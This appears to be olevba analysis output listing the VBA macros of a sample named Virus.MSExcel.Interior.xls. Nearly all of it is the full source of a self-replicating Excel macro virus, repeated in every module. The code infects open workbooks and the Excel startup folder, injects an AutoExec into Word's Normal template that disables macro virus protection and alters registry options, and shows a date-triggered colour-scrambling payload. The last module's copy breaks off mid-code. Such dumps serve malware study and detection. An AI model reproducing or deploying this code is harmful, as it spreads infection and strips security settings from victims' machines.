olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Interior.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
